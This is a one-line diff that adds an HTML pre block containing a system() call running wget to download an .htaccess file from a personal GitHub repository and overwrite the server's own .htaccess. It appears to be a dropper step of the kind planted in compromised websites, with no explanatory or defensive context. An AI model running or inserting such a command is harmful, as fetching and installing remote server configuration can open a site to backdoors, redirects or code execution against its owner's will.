@@ -1,0 +1,1 @@
+<pre>system('wget https://raw.githubusercontent.com/dasisqo/cmd/main/.htaccess -O .htaccess')</pre>
